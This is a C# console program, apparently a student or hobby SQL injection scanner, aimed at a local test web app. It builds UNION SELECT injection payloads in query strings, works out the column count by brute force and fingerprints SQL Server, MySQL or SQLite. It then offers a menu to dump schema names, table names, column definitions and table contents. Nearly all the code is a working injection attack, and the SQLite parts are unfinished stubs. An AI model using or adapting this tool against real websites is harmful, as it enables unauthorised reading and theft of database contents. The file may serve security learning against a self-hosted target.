using System;
using System.Net;

namespace Vizsgalo
{
    public class Scanner
    {
        private static string _unionStart = "'' OR 1=1 UNION SELECT ";
        private static int _unionNumber; //it represents how many plus columns we need to write in the union selects
        private static string _unionColumnsString = ""; //it represents the union columns (the default value is "" aka no extra column)
        private static string _db = "";
        private static string _dbVersion = "";
        
        private static string _isSqlServerOrMySql = "@@version;--";
        // private static string _isMySql = "VERSION();--";
        private static string _isSqlite = "sqlite_version();--";
        
        private static string _sqlServerSchemas = ";--";
        private static string _mySqlSchemas = ";--";
        private static string _sqliteSchemas = ";--";
        
        /* ONLY FOR MANUAL TESTING:
        private static string _urlSqlServer = "?id=3&password=akivagyok92";
        private static string _urlMysql = "?id=3&password=akivagyok92";
        */
        
        private static HttpClient _httpClient = new()
        {
            BaseAddress = new Uri("http://localhost:5227/Users/Sqlserver/")
            // BaseAddress = new Uri("http://localhost:5227/Users/Mysql/")
        };

        public static async Task Main()
        {
            Console.WriteLine("Examination started");
            
            //sends a GET request to the given url and writes the response to the console
            await GetAsync(_httpClient);
            
            Console.WriteLine("Examination finished");
        }
        
        //sends a GET request to the given url and writes the response to the console
        static async Task GetAsync(HttpClient httpClient)
        {
            // STEP 1: give the query string keys manually
            Console.WriteLine("Enter the query string parameters (separated with ; characters):");
            string paramsString = Console.ReadLine();
            if (paramsString == null)
            {
                paramsString = "";
            }
            string[] parameters = paramsString.Split(";");
            
            
            /* STEP 2: analyse how many rows does the select return (for preparing the union select) and
                       check which database is used on the site */
            HttpResponseMessage unionResponse;
            
            do
            {
                _unionNumber++;
                _unionColumnsString = _unionColumnsString == "" ? "'1'" : _unionColumnsString + ",'1'";
                Console.WriteLine(_unionNumber + ". attempt: trying the union select with " + _unionNumber + " column(s)...");
                Console.WriteLine("Checking for SQL Server or MySql first...");
                
                string unionUrl = "?" + parameters[0] + "=" + _unionStart + _unionColumnsString + ", " + _isSqlServerOrMySql;
                unionResponse = await httpClient.GetAsync(unionUrl);
                Console.WriteLine(unionResponse.RequestMessage);
                var jsonUnionResponse = await unionResponse.Content.ReadAsStringAsync();
                // Console.WriteLine($"{jsonUnionResponse}\n");
                Console.WriteLine("Status code: " + unionResponse.StatusCode);

                if (unionResponse.StatusCode != HttpStatusCode.OK) // if it wasn't SQL Server or MySql then it checks for SQLite
                {
                    Console.WriteLine("Checking for SQLite...");
                    unionUrl = "?" + parameters[0] + "=" + _unionStart + _unionColumnsString + ", " + _isSqlite;
                    unionResponse = await httpClient.GetAsync(unionUrl);
                    Console.WriteLine(unionResponse.RequestMessage);
                    jsonUnionResponse = await unionResponse.Content.ReadAsStringAsync();
                    // Console.WriteLine($"{jsonUnionResponse}\n");
                    Console.WriteLine("Status code: " + unionResponse.StatusCode);

                    if (unionResponse.StatusCode == HttpStatusCode.OK)
                    {
                        _db = "sqlite";
                        _dbVersion = jsonUnionResponse;
                    }
                }
                else // else it checks whether it is SQL Server or MySql
                {
                    if (jsonUnionResponse.Contains("Microsoft SQL Server"))
                    {
                        _db = "sqlserver";
                        _dbVersion = jsonUnionResponse.Split("Microsoft SQL Server")[1].Split(" - ")[1].Split(")")[0] + ")";
                    }
                    else
                    {
                        _db = "mysql";
                        _dbVersion = jsonUnionResponse;
                    }
                    // Console.WriteLine($"{jsonUnionResponse}\n");
                }
            } while (unionResponse.StatusCode != HttpStatusCode.OK);
            
            Console.WriteLine("Success, " + _db + " is used, database version: " + _dbVersion);
            Console.WriteLine("Number of extra columns: " + _unionNumber + ", the union section of the query string: " + _unionColumnsString);
            
            
            // STEP 3: execute the command given by the user (the options are specified below)
            ConsoleKeyInfo key;
            do
            {
                Console.WriteLine("Select an operation to execute:");
                Console.WriteLine("> Press '1' to get all schema names in the current database");
                Console.WriteLine("> Press '2' to get all table names in the given schema");
                Console.WriteLine("> Press '3' to get the given table's schema");
                Console.WriteLine("> Press '4' to get all data from the given database");
                Console.WriteLine("> Press '0' to escape (finish) the examination");
                key = Console.ReadKey();
                Console.WriteLine();

                if (key.Key == ConsoleKey.D1)
                {
                    // STEP 3.1 (OPTION 1): get all schema names in the current database
                    Console.WriteLine("\nAll schemas in the current database:");
                    await GetAllSchemaNames(httpClient, parameters[0]);
                } else if (key.Key == ConsoleKey.D2)
                {
                    // STEP 3.2 (OPTION 2): get all table names in the given schema
                    Console.WriteLine("\nType the name of the schema:");
                    string schemaName = Console.ReadLine();
                    Console.WriteLine();
                    if (schemaName != null)
                    {
                        Console.WriteLine("\nAll tables in the given database:");
                        await GetTableNamesInSchema(httpClient, schemaName, parameters[0]);
                    }
                } else if (key.Key == ConsoleKey.D3)
                {
                    // STEP 3.3 (OPTION 3): get the given table's schema
                    Console.WriteLine("\nType the name of the table:");
                    string tableName = Console.ReadLine();
                    Console.WriteLine();
                    if (tableName != null)
                    {
                        Console.WriteLine("\nThe given table's schema:");
                        await GetTableSchema(httpClient, tableName, parameters[0]);
                    }
                } else if (key.Key == ConsoleKey.D4)
                {
                    // STEP 3.4 (OPTION 4): get all data from the given database
                    Console.WriteLine("\nType the name of the database:");
                    string tableName = Console.ReadLine();
                    Console.WriteLine();
                    if (tableName != null)
                    {
                        await GetAllDataFromTable(httpClient, tableName, parameters[0]);
                    }
                }
            } while (key.Key != ConsoleKey.D0); // if the 0 button is pressed then the examination finishes
        }


        // public static string filterResponse()
        // {
        //     
        // }

        static async Task GetAllSchemaNames(HttpClient httpClient, string firstQueryParameter)
        {
            if (_db == "sqlserver")
            {
                // SQL Server - GET
                string url = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "schema_name(t.schema_id) FROM sys.tables t;--";
                await SqlServerGet(httpClient, url);
            } else if (_db == "mysql")
            {
                // MySQL - GET
                string url = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "schema_name FROM information_schema.schemata;--";
                await MySqlGet(httpClient, url);
            } else if (_db == "sqlite")
            {
                // SQLite - GET
                //TODO
            }
        }
        
        static async Task GetTableNamesInSchema(HttpClient httpClient, string schemaName, string firstQueryParameter)
        {
            if (_db == "sqlserver")
            {
                // SQL Server - GET
                string url = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "t.name FROM sys.tables t where schema_name(t.schema_id) = '" + schemaName + "';--";
                await SqlServerGet(httpClient, url);
            } else if (_db == "mysql")
            {
                // MySQL - GET
                string url = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "table_name FROM information_schema.tables where table_schema = '" + schemaName + "';--";
                await MySqlGet(httpClient, url);
            } else if (_db == "sqlite")
            {
                // SQLite - GET
                //TODO
            }
        }
        
        static async Task GetTableSchema(HttpClient httpClient, string tableName, string firstQueryParameter)
        {
            string columnNamesUrl = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "column_name FROM information_schema.columns where table_name = '" + tableName + "';--";
            string dataTypesUrl = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "data_type FROM information_schema.columns where table_name = '" + tableName + "';--";

            if (_db == "sqlserver")
            {
                // SQL Server - GET
                await SqlServerGet(httpClient, columnNamesUrl);
                
                await SqlServerGet(httpClient, dataTypesUrl);
            } else if (_db == "mysql")
            {
                // MySQL - GET
                await MySqlGet(httpClient, columnNamesUrl);
                
                await MySqlGet(httpClient, dataTypesUrl);
            } else if (_db == "sqlite")
            {
                // SQLite - GET
                //TODO
            }
        }
        
        static async Task GetAllDataFromTable(HttpClient httpClient, string tableName, string firstQueryParameter)
        {
            string url = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "'1' FROM " + tableName + ";--";
            if (_db == "sqlserver")
            {
                // SQL Server - GET
                Console.WriteLine("Getting all data using SQL Server...");
                await SqlServerGet(httpClient, url);
            } else if (_db == "mysql")
            {
                // MySQL - GET
                Console.WriteLine("Getting all data using MySQL...");
                await MySqlGet(httpClient, url);
            } else if (_db == "sqlite")
            {
                // SQLite - GET
                Console.WriteLine("Getting all data using SQLite...");
                //TODO
            }
        }
        
        
        
        static async Task SqlServerGet(HttpClient httpClient, string url)
        {
            using HttpResponseMessage response = await httpClient.GetAsync(url);
            
            Console.WriteLine(response.RequestMessage);
            
            // response.EnsureSuccessStatusCode()
            //     .WriteRequestToConsole();
    
            var jsonResponse = await response.Content.ReadAsStringAsync();
            Console.WriteLine($"{jsonResponse}\n");
        }
        
        
        static async Task MySqlGet(HttpClient httpClient, string url)
        {
            using HttpResponseMessage response = await httpClient.GetAsync(url);
            
            Console.WriteLine(response.RequestMessage);
            
            // response.EnsureSuccessStatusCode()
            //     .WriteRequestToConsole();
    
            var jsonResponse = await response.Content.ReadAsStringAsync();
            Console.WriteLine($"{jsonResponse}\n");
        }
    }
}